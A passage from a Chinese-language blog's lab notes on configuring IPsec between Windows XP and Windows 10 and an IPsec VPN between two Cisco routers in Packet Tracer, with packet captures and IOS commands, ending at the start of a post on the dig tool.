<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565750521942.png" alt="1565750521942"></p>
</li>
<li><p>鼠标右键，属性，添加规则并进行相应的配置</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565750573154.png" alt="1565750573154"></p>
<p>选择此规则不指定隧道</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565750733585.png" alt="1565750733585"></p>
<p>选择所有网络连接</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565750738506.png" alt="1565750738506"></p>
<p>身份验证方法采用<code>此字符串用来保护密钥交换</code>，输入字符串：<code>abcdef</code>（可换成其它内容）</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565750726353.png" alt="1565750726353"></p>
<p>IP筛选列表选择<code>所有IP通讯量</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565750719310.png" alt="1565750719310"></p>
<p>筛选器操作选择<code>需要安全</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565750713094.png" alt="1565750713094"></p>
<p>点击下一步完成</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565750707568.png" alt="1565750707568"></p>
</li>
<li><p>至此，<code>Windows xp</code>下的<code>IPSEC</code>配置完成，操作过程中没有报错。</p>
</li>
<li><p>以同样的方式配置<code>windows 10</code>下的<code>IPSEC</code>，这里与<code>windows xp</code>配置大致相同，截图只用于说明不同点。通过<code>secpol.msc</code>打开<code>windows 10</code>本地安全设置</p>
</li>
<li><p>在IP安全策略下右键，创建安全策略</p>
</li>
<li><p>设置配置名称为<code>Levis</code>（个人随意），由于激活默认响应规则仅限于windows早期版本，故不选择激活默认响应规则，过程中，没有身份认证选择</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565750867578.png" alt="1565750867578"></p>
</li>
<li><p>点击默认设置，一直到属性窗口，添加规则：选择此规则不指定隧道、选择所有网络连接、在IP筛选列表中点击添加，名称为<code>新IP筛选列表</code>，并点击添加，之后选择默认操作</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565750894238.png" alt="1565750894238"></p>
</li>
<li><p>选择刚刚建立的IP筛选列表，点击下一步</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565750912175.png" alt="1565750912175"></p>
<p>选择<code>添加IP筛选器</code>操作, 选择<code>协商安全</code>,继续默认操作</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565750927973.png" alt="1565750927973"></p>
</li>
<li><p>选择刚刚建立的新筛选器操作，点击下一步</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751013806.png" alt="1565751013806"></p>
<p>身份验证方法采用<code>此字符串用来保护密钥交换</code>，输入字符串：<code>abcdef</code>(与上面的相同)</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751045367.png" alt="1565751045367"></p>
<p>单击下一步，选择默认操作直至筛选器配置完成</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751059737.png" alt="1565751059737"></p>
</li>
<li><p>回到原来窗口，鼠标右键，分配，至此，<code>Windows 10</code>下的<code>IPSEC</code>配置完成，操作过程中没有报错</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751094123.png" alt="1565751094123"></p>
</li>
</ol>
<h1 id="开始通信"><a href="#开始通信" class="headerlink" title="开始通信"></a>开始通信</h1><ol>
<li><p>查看<code>win xp</code>和<code>win 10</code>的IP地址分别为<code>192.168.88.150</code>和<code>192.168.88.1</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751203055.png" alt="1565751203055"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751209608.png" alt="1565751209608"></p>
</li>
<li><p>关闭<code>win 10</code>的<code>IPSEC服务</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751231217.png" alt="1565751231217"></p>
</li>
<li><p>使用<code>win 10</code> <code>ping</code> <code>win xp</code>，请求超时，<code>ping</code>不通</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751256734.png" alt="1565751256734"></p>
</li>
<li><p>对通信过程进行抓包，可以看到<code>win 10</code>一直请求<code>IPsec SA</code>但总不成功</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751296152.png" alt="1565751296152"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751303769.png" alt="1565751303769"></p>
</li>
<li><p>重新开启<code>win 10</code>的<code>IPSEC服务</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751347220.png" alt="1565751347220"></p>
</li>
<li><p>使用<code>win 10</code>重新<code>ping</code> <code>win xp</code>，发现成功<code>ping</code>通</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751382839.png" alt="1565751382839"></p>
</li>
<li><p>对通信过程进行抓包，由于此时<code>win xp</code>和<code>win10</code>都采用的是默认的<code>esp加密</code>，所以抓包显示的是<code>esp包</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751410628.png" alt="1565751410628"></p>
</li>
<li><p><code>Win 10</code>和<code>win xp</code>都设置仅<code>AH通信</code>，不经过<code>ESP加密</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751464369.png" alt="1565751464369"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751469876.png" alt="1565751469876"></p>
</li>
<li><p>继续使用<code>win 10</code> <code>ping </code> <code>win xp</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751524436.png" alt="1565751524436"></p>
</li>
<li><p>对通信过程进行抓包，发现没有<code>ESP加密</code>后数据包格式为<code>ICMP</code>，数据为<code>abcdef</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751552052.png" alt="1565751552052"></p>
</li>
<li><p><code>Win 10</code>和<code>win xp</code>都设置仅<code>esp认证</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751600836.png" alt="1565751600836"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751605269.png" alt="1565751605269"></p>
</li>
<li><p>继续使用<code>win 10</code> <code>ping</code> <code>win xp</code>，并对通信过程进行抓包，数据没有通过<code>esp加密</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751650128.png" alt="1565751650128"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751654675.png" alt="1565751654675"></p>
</li>
<li><p>分析<code>IKE SA</code>和<code>IPSEC SA</code>建立过程</p>
<p>要建立<code>IPSec连接</code>，首先要协商一个<code>IKE SA</code>，然后在<code>IKE SA</code>的基础上协商<code>IPSec SA</code></p>
<ol>
<li><p>IKE SA建立分为三个阶段</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751806471.png" alt="1565751806471"></p>
<ol>
<li><p><code>SA交换</code>，协商确认有关安全策略。该过程进行安全协商</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751818033.png" alt="1565751818033"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751825295.png" alt="1565751825295"></p>
</li>
<li><p>密钥交换阶段，主要交换密钥<code>Diffie-Hellman公共值</code>。数据包中的<code>Key Exchange</code>用于交换各自加密生成的<code>主密钥</code>；<code>Nonce</code>使用了随机数，防止重放攻击；加密所用的密钥为<code>ipsec</code>中设定的<code>预共享密钥</code>； <code>NAT-D</code>为双方的ip+端口的Hash值。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751889825.png" alt="1565751889825"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751893903.png" alt="1565751893903"></p>
</li>
<li><p>ID信息和认证数据交换，进行身份认证，对第一阶段交换内容的认证。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751913263.png" alt="1565751913263"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751919016.png" alt="1565751919016"></p>
</li>
</ol>
</li>
<li><p><code>IPSec SA</code>建立分为两个阶段，都是加密数据，无法查看。用到了<code>Quick-Mode</code>，目的是在两个对等体间协商一组一致的参数来创建<code>IPSec SA</code>，用于真实数据的加解密，并且在此进行<code>PFS</code>，<code>PFS</code>及在<code>Quick-Mode</code>重新做<code>DH</code>的交换，产生新的密钥用于<code>IPSec</code>数据的加密。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565752070936.png" alt="1565752070936"></p>
</li>
</ol>
</li>
</ol>
<h1 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h1><p>Q：IKE密钥协商过程是否存在安全威胁？</p>
<p>A：<code>IPSec密钥交换过程</code>分为两个独立阶段。第一阶段通信双方彼此建立一个通过身份认证和安全保护的隧道，称为<code>ISAKMP SA</code>。只要<code>ISAKMP SA</code>建立起来，所有发起方和应答方之间的<code>IKE</code>通信信息都通过加密、完整性检查和认证的方法受到保护。第二阶段的建立是为特定的<code>Internet</code>安全协议(如<code>IPSec</code>等)创建安全关联(<code>IPSec SA</code>)。IKE第一阶段的目的是建立一个<code>安全隧道</code>，使得第二阶段的协商可以秘密地进行。两台主机之间可以同时建立多个<code>ISAKMP SA</code>，一个<code>ISAKMP SA</code>也可以创建多个<code>IPSec SA</code>，<code>ISAKMP SA</code>的结束不会影响它创建的<code>IPSec SA</code>发生作用。这种密钥协商过程是存在着漏洞的，可以通过中间人攻击和拒绝服务攻击实现漏洞利用。</p>
<h1 id="PacketTracer-VPN配置"><a href="#PacketTracer-VPN配置" class="headerlink" title="PacketTracer VPN配置"></a>PacketTracer VPN配置</h1><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><ul>
<li>系统：<code>Windows xp</code></li>
<li>软件工具：思科官方模拟器<code>Packet Tracer 5.3</code></li>
<li>模拟实体：2台<code>cisco2800</code>系列路由器、2台24端口以太网交换机和若干PC电脑</li>
</ul>
<h2 id="安装Packet-Tracer-5-3"><a href="#安装Packet-Tracer-5-3" class="headerlink" title="安装Packet Tracer 5.3"></a>安装<code>Packet Tracer 5.3</code></h2><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565752499838.png" alt="1565752499838"></p>
<h2 id="配置安全策略"><a href="#配置安全策略" class="headerlink" title="配置安全策略"></a>配置安全策略</h2><p>​        新建一条安全策略<code>PacketTracer</code>，添加IP安全规则，隧道方式为<code>不指定隧道</code>，网络类型选择<code>所有网络连接</code>，身份验证方法选择<code>用字符串保护密钥交换</code>，输入：<code>123</code>；进入IP筛选器列表的配置项，设置一个新的IP筛选器列表，新建一个IP筛选器，将<code>我的IP地址</code>作为源地址，将<code>任何IP地址</code>作为目标地址，在<code>选择协议类型</code>中选中<code>任意</code>，新建一个筛选操作，设置为<code>协商安全</code>，选中<code>不和不支持IPSec的计算机通讯</code>，以要求必须在<code>IPSec</code>基础上进行连接，<code>IP通讯安全设施</code>中选择选择<code>自定义</code>，然后点击<code>设置</code>选择如下图，选择默认直至配置完成</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565752762492.png" alt="1565752762492"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565752769614.png" alt="1565752769614"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565752775749.png" alt="1565752775749"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565752781587.png" alt="1565752781587"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565752791438.png" alt="1565752791438"></p>
<h2 id="初始化配置路由器"><a href="#初始化配置路由器" class="headerlink" title="初始化配置路由器"></a>初始化配置路由器</h2><ol>
<li><p>打开<code>cisco模拟器</code>，在模拟器窗口工具栏下选择<code>file--new</code>。在左下角设备栏选取路由器图标<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565752837430.png" alt="1565752837430">将<code>cisco2811路由器</code><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565752870121.png" alt="1565752870121">拖到工作区域，单击工作区域的路由器图标，选择<code>CLI项</code>，弹出如图所示界面</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565752887288.png" alt="1565752887288"></p>
<p>输入no,回车两次</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565752901653.png" alt="1565752901653"></p>
</li>
<li><p>进入路由器特权模式配置路由器网卡IP，输入命令如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Router&gt;enable	//进入特权模式，只有在特权模式下才可以对路由器进行配置</span><br><span class="line">Router#configure terminal		//进入配置状态，通过端口进行配置</span><br><span class="line">Router(config)# interface fastEthernet 0/0	//进入端口f0/0 </span><br><span class="line">Router(config-if)#ip address 10.0.0.1 255.255.255.0	#配置网卡f0/0的ip地址和子网掩码</span><br><span class="line">Router(config-if)#no shutdown		//开启端口f0/0</span><br><span class="line">Router(config-if)#end		//返回特权模式</span><br><span class="line">Router#configure terminal		//进入配置状态，通过端口进行配置</span><br><span class="line">Router(config)# interface fastEthernet 0/1  //进入端口f0/1</span><br><span class="line">Router(config-if)#ip address 192.168.1.1 255.255.255.0  //配置网卡f0/1的ip地址和子网掩码 </span><br><span class="line">Router(config-if)#no shutdown		//开启端口f0/1</span><br><span class="line">Router(config-if)#end		//返回特权模式</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565753153340.png" alt="1565753153340"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565753169156.png" alt="1565753169156"></p>
</li>
<li><p>初始配置<code>router 0</code>完成，根据<code>router 0</code>的配置过程完成<code>router 1</code>的配置，其中<code>router 1</code>的<code>f0/0</code>端口IP为<code>10.0.0.2/24</code>, <code>router 1</code>的<code> f0/1</code>端口的IP地址为<code>192.168.2.1/24</code></p>
</li>
<li><p>配置完成后，点击<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565753230234.png" alt="1565753230234">选择<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565753259250.png" alt="1565753259250">将<code>router 0</code>和<code>router 1</code>的<code>f0/0</code>端口连接</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565753295977.png" alt="1565753295977"></p>
</li>
</ol>
<h2 id="搭建网络环境"><a href="#搭建网络环境" class="headerlink" title="搭建网络环境"></a>搭建网络环境</h2><ol>
<li><p>在模拟器左下角选择<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565753335417.png" alt="1565753335417">选取<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565753354773.png" alt="1565753354773">拖到绘图工作区，双击<code>PC图标</code>，选择<code>Desktop</code>，如图所示</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565753392229.png" alt="1565753392229"></p>
</li>
<li><p>选择<code>IP Configuration</code>，配置PC的IP地址和子网掩码，如图所示</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565753511671.png" alt="1565753511671"></p>
</li>
<li><p>重复上述操作，配置六台PC，它们的IP地址分别为</p>
<ul>
<li><code>192.168.1.10</code></li>
<li><code>192.168.1.20</code></li>
<li><code>192.168.1.30</code></li>
<li><code>192.168.2.10</code></li>
<li><code>192.168.2.20</code></li>
<li><code>192.168.2.30</code></li>
</ul>
<p>子网掩码全为<code>255.255.255.0</code>，前三台网关为<code>192.168.1.1</code>，后三台网关为<code>192.168.2.1</code></p>
</li>
<li><p>选取交换机<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565753557584.png" alt="1565753557584">拖至工作区，在<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565753568432.png" alt="1565753568432">中选取<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565753573910.png" alt="1565753573910">将路由器于交换机相连，将交换机于PC相连；最终完成如图所示的网络图</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565753598090.png" alt="1565753598090"></p>
</li>
</ol>
<h2 id="配置路由"><a href="#配置路由" class="headerlink" title="配置路由"></a>配置路由</h2><p>在路由器中配置路由，使路由器两端的网络互通</p>
<ol>
<li><p>配置<code>router 0</code>，双击<code>router 0</code>图标，选择<code>CLI项</code>，进入路由器配置窗口，输入命令如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Router&gt;en</span><br><span class="line">Router#configure  terminal</span><br><span class="line">Router(config)# ip route 0.0.0.0  0.0.0.0 fastEthernet 0/0  //配置内网访问外部网络的出口路由</span><br><span class="line">Router(config)#ip route 192.168.1.0  255.255.255.0  fastEthernet  0/1  //配置外部访问内部网络入口路由</span><br><span class="line">Router(config)#end</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565753735869.png" alt="1565753735869"></p>
</li>
<li><p>配置<code>router 1</code>，双击<code>router 1</code>图标，选择<code>CLI项</code>，进入路由器配置窗口，输入命令如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Router&gt;en</span><br><span class="line">Router#configure  terminal</span><br><span class="line">Router(config)# ip route 0.0.0.0  0.0.0.0 fastEthernet 0/0  //配置内网访问外部网络的出口路由</span><br><span class="line">Router(config)#ip route 192.168.2.0  255.255.255.0  fastEthernet  0/1  //配置外部访问内部网络入口路由</span><br><span class="line">Router(config)#end</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565753789862.png" alt="1565753789862"></p>
</li>
</ol>
<h2 id="测试网络的互通性"><a href="#测试网络的互通性" class="headerlink" title="测试网络的互通性"></a>测试网络的互通性</h2><ol>
<li><p>双击<code>PC0图标</code>，在弹出的对话框中，选择<code>Desktop</code>，选择<code>Command Prompt</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565753835594.png" alt="1565753835594"></p>
</li>
<li><p>使用<code>ping</code>命令，<code>ping</code> <code>192.168.1.1</code>、<code>10.0.0.1</code>、<code>192.168.2.10</code>、<code>10.0.0.2</code>、<code>192.168.3.10</code>结果除了最后一个地址(该地址不存在)其它全能<code>ping</code>通，表明搭建的网络满足实验环境</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565753900939.png" alt="1565753900939"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565753905408.png" alt="1565753905408"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565753915519.png" alt="1565753915519"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565753921041.png" alt="1565753921041"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565753925827.png" alt="1565753925827"></p>
</li>
</ol>
<h2 id="配置IPSec-VPN"><a href="#配置IPSec-VPN" class="headerlink" title="配置IPSec VPN"></a>配置IPSec VPN</h2><ol>
<li><p>配置<code>router 0</code>，双击<code>router 0</code>图标，选择<code>CLI项</code>，进入路由器配置窗口</p>
<ol>
<li><p>定义<code>IKE</code>的策略(<code>router 0</code>和<code>router1</code>之间的密钥交换策略)，<code>IKE</code>只是密钥的交换策略,在使用加密对称和非对称加密算法的时候,需要密钥来对数据加密,下面的IKE策略只是建立一条管理连接，负责加密生成的各种密钥，输入命令如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Router#configure terminal		//进入配置状态，通过端口进行配置</span><br><span class="line">Router (config)#crypto isakmp policy 10		//一个IKE的策略，号码是10，数字越低，策略优先级越高</span><br><span class="line">Router (config-isakmp)# authentication pre-share	//使用预定义共享密钥进行设备认证</span><br><span class="line">Router (config-isakmp)#hash md5	   //认证方式使用MD5进行认证</span><br><span class="line">Router (config-isakmp)#encryption des		//加密方式使用DES，可选AES/DES</span><br><span class="line">Router (config-isakmp)#group 2		//指定DH组</span><br><span class="line">Router (config-isakmp)# lifetime 86400		//对生成新SA的周期进行调整，两端的路由器都要设置相同的SA周期</span><br><span class="line">Router (config-isakmp)# exit</span><br><span class="line">Router (config)#crypto isakmp key leeyuxun address 10.0.0.2   //定义一个密码,密码是leeyuxun，和地址为10.0.0.2的设备去交换密钥</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565754108455.png" alt="1565754108455"></p>
</li>
<li><p>定义数据的<code>加密方式</code>和<code>认证方式</code>，配置<code>IPSec</code>，输入命令如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Router (config)#access-list 110 permit ip 192.168.1.0 0.0.0.255 192.168.2.0  0.0.0.255	//定义访问控制列表,这里的访问控制列表不是对数据进行过滤，是定义那些数据应该被加密，也可以理解哪些数据触发IPSec 流</span><br><span class="line">Router (config)#crypto ipsec transform-set mine esp-des esp-md5-hmac	//设置数据的加密方式，策略名字为mine，使用ESP-DES对数据加密，ESP-MD5-HMAC对数据认证</span><br><span class="line">Router(config)# crypto map mymap 101 ipsec-isakmp  //定义一个map,调用刚才做的策略</span><br><span class="line">Router(config-crypto-map)# match address 110		//匹配出访问控制列表110的数据</span><br><span class="line">Router(config-crypto-map)# set peer 10.0.0.2      //标识对端路由器的合法IP地址</span><br><span class="line">Router(config-crypto-map)# set pfs group2</span><br><span class="line">Router(config-crypto-map)# set transform-set mine  //使用刚才定义好的策略对数据加密</span><br><span class="line">Router(config-crypto-map)# set security-association lifetime seconds 86400	//指定IPSec SA的存活期</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565754214633.png" alt="1565754214633"></p>
</li>
<li><p>将<code>map</code>映射到<code>公网端口</code>，一个端口只能映射一个<code>map</code>，输入命令如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Router（config）interface fastEthernet 0/0</span><br><span class="line">Router(config-if)#crypto map mymap</span><br><span class="line">*Jan  3 07:16:26.785: %CRYPTO-6-ISAKMP_ON_OFF: ISAKMP is ON</span><br><span class="line">Router（config-if）end</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565754280097.png" alt="1565754280097"></p>
</li>
<li><p>查看策略</p>
<ol>
<li><p>查看<code>IKE策略</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Router# show crypto ipsec transform-set</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565754404902.png" alt="1565754404902"></p>
</li>
<li><p>查看<code>IPSec变换集</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Router# show crypto ipsec transform-set</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565754395872.png" alt="1565754395872"></p>
</li>
<li><p>查看 <code>crypto maps</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Router# show crypto map</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565754412022.png" alt="1565754412022"></p>
</li>
</ol>
</li>
</ol>
</li>
<li><p>配置<code>router 1</code>，双击<code>router 1</code>图标，选择<code>CLI项</code>，进入路由器配置窗口</p>
<ol>
<li><p>定义<code>IKE</code>的策略，与配置<code>route 0</code>相同</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565754476249.png" alt="1565754476249"></p>
</li>
<li><p>定义数据的加密方式和认证方式，配置<code>IPSec</code>，与配置<code>route 0</code>相同</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565754507611.png" alt="1565754507611"></p>
</li>
<li><p>将<code>map</code>映射到<code>公网端口</code>，与配置<code>route 0</code>相同</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565754534083.png" alt="1565754534083"></p>
</li>
</ol>
</li>
</ol>
<h2 id="测试IPSec-VPN"><a href="#测试IPSec-VPN" class="headerlink" title="测试IPSec VPN"></a>测试IPSec VPN</h2><ol>
<li><p>测试<code>VPN连通性</code></p>
<p>双击<code>PC0</code>图标，在弹出的对话框中，选择<code>Desktop</code>，选择<code>Command Prompt</code>，<code>ping 192.168.2.10</code>，如下图所示</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565754619936.png" alt="1565754619936"></p>
</li>
<li><p>验证数据经过<code>IPSec VPN</code> <code>加密传输</code>，点击进入<code>simulation mode</code>，弹出如图所示对话框</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565754651966.png" alt="1565754651966"></p>
</li>
<li><p>重复上一步操作，<code>simulation Panel</code>中选取<code>Auto Capture</code>，观察工作区动画，展示了数据包在网络中的传送过程</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565754673001.png" alt="1565754673001"></p>
</li>
<li><p>双击路由器<code>router 0</code>处数据包，弹出如图所示弹框，可以分析出数据包的信息</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565754694830.png" alt="1565754694830"></p>
<ul>
<li>进入路由器的数据包（左侧）的信息源IP是<code>192.168.1.10</code>，目的IP是<code>192.168.2.10</code></li>
<li>路由器出去的数据包(右侧)的源IP改变为<code>10.0.0.1</code>，目的IP变为<code>10.0.0.2</code></li>
<li>从上图的第六条信息中发现<code>ESP encrypts the received packet</code>的信息</li>
<li>综上，从<code>PC0</code>（<code>192.168.1.10</code>）发往对端<code>PC3</code>（<code>192.168.2.10</code>）的数据经过了路由器的<code>IPSec VPN</code>模块加密处理，隐藏了内网的IP地址信息，从而保护了内网的数据</li>
</ul>
</li>
<li><p>断开<code>VPN</code></p>
<ol>
<li><p>断开<code>router 0</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Router（config）#interface fastEthernet 0/0</span><br><span class="line">Router(config-if)#no crypto map mymap</span><br><span class="line">Router（config-if）end</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565754841629.png" alt="1565754841629"></p>
</li>
<li><p>双击<code>PC0</code>图标，在弹出的对话框中，选择<code>Desktop</code>，选择<code>Command Prompt</code>，<code>ping 192.168.2.10</code>，<code>ping</code>不通，表明只断开一端路由器的端口<code>map映射</code>，两边无法连通</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565754877800.png" alt="1565754877800"></p>
</li>
<li><p>以同样的方式断开route 1</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Router（config）#interface fastEthernet 0/0</span><br><span class="line">Router(config-if)#no crypto map mymap</span><br><span class="line">Router（config-if）end</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565754906347.png" alt="1565754906347"></p>
</li>
<li><p>双击<code>PC0</code>图标，在弹出的对话框中，选择<code>Desktop</code>，选择<code>Command Prompt</code>，<code>ping 192.168.2.10</code>，<code>ping</code>成功，表明两端都断开后，两边网络可以再次保持连接</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565754947901.png" alt="1565754947901"></p>
</li>
<li><p>抓取经过<code>route 0</code>的数据包，发现数据不再加密传输。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565761734124.png" alt="1565761734124"></p>
</li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>网络安全实验</category>
      </categories>
      <tags>
        <tag>VPN配置</tag>
        <tag>IPSec</tag>
        <tag>PacketTracer</tag>
      </tags>
  </entry>
  <entry>
    <title>dig简单使用</title>
    <url>/dig%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>域名信息搜素器（Dig）是一个类似于nslookup的强大工具，它不仅支持运行命令行选项，而且还支持在查询多个域名时将文件通过管道直接导入，本文将大致介绍dig的一般使用方法；</p>
<span id="more"></span>

